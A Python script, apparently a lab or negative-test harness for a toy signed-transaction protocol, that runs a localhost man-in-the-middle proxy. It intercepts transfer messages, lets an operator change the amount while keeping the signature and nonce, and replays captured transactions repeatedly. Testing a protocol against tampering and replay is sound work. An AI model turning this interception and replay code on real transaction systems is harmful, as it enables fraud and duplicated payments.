import socket
import threading
import logging

MITM_HOST = "127.0.0.1"
MITM_PORT = 4000       # aquí se conecta el cliente

REAL_HOST = "127.0.0.1"
REAL_PORT = 5000       # servidor real

logging.basicConfig(filename='prueba_negativa.log', encoding='utf-8', level=logging.INFO, format='%(asctime)s - %(message)s')

replay_attack_enabled = False
number_of_replays = 0
mensaje_seguro_a_repetir = None

def MITMAttack(dst, origen, destino, firma, nonce):
    logging.info(f"[MITM] Realizando ataque MITM: introduzca la cantidad que desea enviar en la transacción")
    print("Realizando ataque MITM: introduzca la cantidad que desea enviar en la transacción")
    cantidad = input(">> ")
    logging.info(f"[MITM] {cantidad}")
    mensaje_modificado = f"{origen}|{destino}|{cantidad}"
    mensaje_modificado_seguro = f"{mensaje_modificado}|{firma}|{nonce}"
    dst.sendall(mensaje_modificado_seguro.encode())

def forward(src, dst, direction):
    global replay_attack_enabled, number_of_replays, mensaje_seguro_a_repetir

    while True:
        try:
            data = src.recv(4096)
            if not data:
                break
            
            mensaje_seguro = data.decode(errors="ignore")
            print(f"[{direction}] {mensaje_seguro}")

            if "|" in mensaje_seguro and direction == "C->S":
                partes_mensaje_seguro = mensaje_seguro.split("|")
                if len(partes_mensaje_seguro) == 5:
                    origen, destino, cantidad, firma, nonce = partes_mensaje_seguro
                    logging.info(f"[MITM] Mensaje original:")
                    logging.info(f"[MITM] --- DATOS RECIBIDOS ---")
                    logging.info(f"[MITM] Cuenta origen: {origen}")
                    logging.info(f"[MITM] Cuenta destino: {destino}")
                    logging.info(f"[MITM] Cantidad: {cantidad}")
                    logging.info(f"[MITM] ---------")
                    logging.info(f"[MITM] Qué tipo de ataque quieres realizar? (1: MITM, 2: Replay)")
                    print("Mensaje original:")
                    print("\n--- DATOS RECIBIDOS ---")
                    print("Cuenta origen:", origen)
                    print("Cuenta destino:", destino)
                    print("Cantidad:", cantidad)
                    print("---------\n")
                    print("Qué tipo de ataque quieres realizar? (1: MITM, 2: Replay)")
                    tipo_ataque = input(">> ")
                    logging.info(f"[MITM] {tipo_ataque}")
                    while tipo_ataque not in ["1", "2"] and not replay_attack_enabled:
                        logging.info(f"[MITM] Opción no válida. Por favor, introduzca 1 para MITM o 2 para Replay.")
                        print("Opción no válida. Por favor, introduzca 1 para MITM o 2 para Replay.")
                        tipo_ataque = input(">> ")
                        logging.info(f"[MITM] {tipo_ataque}")

                    if tipo_ataque == "1":
                        MITMAttack(dst, origen, destino, firma, nonce)
                    elif tipo_ataque == "2":
                        replay_attack_enabled = True
                        logging.info(f"[MITM] ¿Cuantas veces quieres repetir el mensaje?")
                        print("¿Cuantas veces quieres repetir el mensaje?")
                        number_of_replays = int(input(">> "))
                        logging.info(f"[MITM] {number_of_replays}")
                        mensaje_seguro_a_repetir = mensaje_seguro

            if replay_attack_enabled and direction == "S->C":
                if mensaje_seguro == "> ¿Desea realizar otra transacción? (S/N)":
                    logging.info(f"[MITM->S] S")
                    src.sendall("S".encode())
                    continue
                elif mensaje_seguro == "> Introduzca a continuación la cuenta origen, destino y cantidad de la transacción":
                    logging.info(f"[MITM->S] {mensaje_seguro_a_repetir}")
                    src.sendall(mensaje_seguro_a_repetir.encode())
                    number_of_replays -= 1
                    if number_of_replays <= 0:
                        replay_attack_enabled = False
                    continue
                else:
                    continue


            dst.sendall(data)

        except:
            break

    src.close()
    dst.close()


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mitm:
    mitm.bind((MITM_HOST, MITM_PORT))
    mitm.listen()

    logging.info(f"[MITM] MITM escuchando en {MITM_PORT}")
    print("MITM escuchando en", MITM_PORT)

    while True:
        client_sock, addr = mitm.accept()
        logging.info(f"[MITM] Cliente conectado: {addr}")
        print("Cliente conectado:", addr)

        identidad_cliente = client_sock.recv(1024)

        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((REAL_HOST, REAL_PORT))

        server_sock.send("MITM".encode())

        threading.Thread(
            target=forward,
            args=(client_sock, server_sock, "C->S"),
            daemon=True
        ).start()

        threading.Thread(
            target=forward,
            args=(server_sock, client_sock, "S->C"),
            daemon=True
        ).start()
